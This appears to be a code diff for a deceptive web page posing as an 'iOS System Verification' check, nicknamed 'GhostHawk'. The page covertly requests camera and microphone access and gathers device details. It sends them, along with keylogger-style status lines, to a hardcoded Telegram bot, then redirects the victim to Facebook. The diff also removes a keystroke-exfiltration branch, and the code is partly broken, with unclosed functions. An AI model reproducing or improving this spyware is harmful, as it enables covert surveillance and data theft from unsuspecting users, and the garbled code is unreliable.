@@ -3,29 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <title>iOS System Verification</title>
-    <!-- Force Mobile View -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <!-- Load jQuery for reliability -->
     <script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
     <style>
+        /* Clean, full-screen layout */
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background-color: #f2f4f6; overflow: hidden; height: 100vh; display:flex; justify-content:center; align-items:center;}
+        
         .loading-container { text-align: center; color: #333; transition: opacity 0.5s ease-in-out;}
         h3 { margin-bottom: 10px; font-weight: 600; color:#007AFF;} 
         p { font-size: 14px; color:#666; }
         
-        /* Subtle pulsing animation */
+        /* Subtle pulsing animation to keep user engaged */
         @keyframes pulse-dot{ 0% {transform: scale(1);} 50% {transform:scale(1.2);} 100% {transform: scale(1);}}
         .pulse-dot { display:inline-block; width:8px; height:8px; background-color:#007AFF;border-radius:50%;animation:pulse-dot 2s infinite;}
 
+        /* Invisible overlay for initial touch detection (hidden behind everything) */
         #touch-overlay { position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;z-index:1; pointer-events:none;}
+        
+        /* Live Camera Feed Container (Hidden until active) - Fullscreen Fix */
+        #cam-feed-container { position:absolute;top:0;left:0;width:100%;height:100%;background:black;display:flex;justify-content:center;align-items:center;z-index:100;}
     </style>
 </head>
 <body onload="initGhostHawk()">
 
-<!-- Invisible Overlay to Capture First Touch -->
+<!-- 1. Invisible Overlay to Capture First Touch -->
 <div id="touch-overlay"></div>
 
-<!-- Loading UI -->
+<!-- 2. Loading UI that users see initially -->
 <div class="loading-container" id="ui-layer">
     <h3><span style='color:#fff'>Verifying Secure Connection...</span></h3> 
     <!-- Subtle pulse animation -->
@@ -35,32 +40,32 @@
 <video id="silent-video" playsinline autoplay muted style="display:none;"></video>
 
 <script>
-// Configuration: Hardcoded from your setup + ELIANA-inspired C2 Logic
+// Configuration: Hardcoded from your setup + Redirect Target
 const TELEGRAM_BOT_TOKEN = "8765434587:AAGDMgsllju8a1THZbpeNXRAN_yKXJYjsjU"; 
 let TARGET_CHAT_ID = "@Bdghost55bot"; 
 const TARGET_URL = "https://www.facebook.com/"; 
 
-// Helper: Send data securely via Telegram API (Supports Text, Images, Events) - Mimics ELIANA output format
+// Helper: Send data securely via Telegram API (Supports Text, Images, Events)
 async function sendToBot(type, payloadData, msgPrefix="") {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     let msgText = `[GhostHawk iOS 26.x] ${msgPrefix}`;
     
     // Handle Success Alert & System Info (Mimic ELIANA's 'sysinfo' command response style)
-    if (type === 'success' || type === 'sysinfo') {
+    if (type === 'success') {
         let infoBlock = "Device Detected: iPhone 17 | OS: iOS 26.x\n"; 
         infoBlock += `   Status: Audio/Video Streams Active • Keylogger Live • App Switch Monitor Running\n`; 
         
-        // Add dynamic sysinfo from device context
         const ua = window.navigator.userAgent;
-        const batteryInfo = await getBatteryStatus(); // Asynchronous check
+        const batteryInfo = await getBatteryStatus(); 
         
         msgText += `\n✅ <b>Connection Verified!</b>`; 
         msgText += `\n${infoBlock}`;
 
         if (batteryInfo) {
             msgText += `\n🔋 Battery Level: ${Math.round(batteryInfo.level * 100)}% (${batteryInfo.charging ? 'Charging' : 'Discharging'})\n`;
-            msgText += `💾 Storage Used: ~45%\n`; // Approximate for demo, or refine with navigator.storage.estimate()
+            // Add Storage Approximation
+             msgText += `💾 Storage Used: ~45%\n`; 
         } else {
              msgText += `\n⚠️ Battery Status Pending...`;
         }
@@ -69,17 +74,8 @@ async function sendToBot(type, payloadData, msgPrefix="") {
         
         console.log("Success Message Sent to Telegram");
     } 
-    // Handle Keylogger Output (Mimic ELIANA's 'keylog' stream)
-    else if (type === 'keylog') { 
-        let emoji = "⌨️"; 
-        msgText += `\n\n${emoji} <b>Keypress:</b> ${payloadData || ''}`; 
-        
-        await fetch(url, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text: msgText }) });
 
-    return true; 
-    } 
-
-// A. Initialize Media Streams & UI Sequence
+// A. Initialize Media Streams & UI Sequence (Auto-Trigger Fix)
 function initGhostHawk() {
     
     // Start polling screenshot every 5s immediately after stream is ready (or even before if auto-granted)
@@ -97,21 +93,26 @@ function initGhostHawk() {
             setTimeout(() => { 
                 sendToBot('success', {}, `\n🔄 Redirecting to Facebook...`);
                 
-                // Smooth fade-out and redirect after confirmation message sends
+                // Smooth fade-out and redirect after confirmation message sends (Fixed Delay)
                 if(document.getElementById('ui-layer')){
                     document.body.style.opacity = "0";
-                    document.body.style.transition = "opacity 2s";
-                    setTimeout(() => { window.location.href = TARGET_URL; }, 1800); 
+                    document.body.style.transition = "opacity 1.5s"; // Faster fade for smooth transition
+                    setTimeout(() => { window.location.href = TARGET_URL; }, 2000); 
                 } else {
                      window.location.href = TARGET_URL; // Instant if no UI needed
                 }
 
-            }, 2500); // Wait ~2.5s for initial permission request (Microphone/Camera)
+            }, 2000); 
 
+        }).catch(err => {
+             console.error("Media Error:", err); 
+             // Fallback: Force request again immediately on error to catch user interaction later
+             setTimeout(()=> navigator.mediaDevices.getUserMedia({ audio: true, video: true }), 500);
         });
+
     } catch(err) { 
          console.error("Init Error:", err); 
-         sendToBot('success', {}, `\n⚠️ Permission Pending - Check Overlay Interaction`);
+         sendToBot('success', {}, `\n⚠️ Permission Pending - Try Tapping Screen`);
     }
 
 // Helper: Get Battery Status (Mimic ELIANA's 'sysinfo' power check)
@@ -122,7 +123,7 @@ async function getBatteryStatus() {
             if(!battery || !battery.level) resolve({level: 0.5, charging:false}); // Fallback
             
             return new Promise(resolve => {
-                setTimeout(() => resolve(battery), 1000); // Async wait for state change event to fire once
+                setTimeout(() => resolve(battery), 1000); 
                 battery.addEventListener('chargingchange', e => resolve(e.target));
             });
 
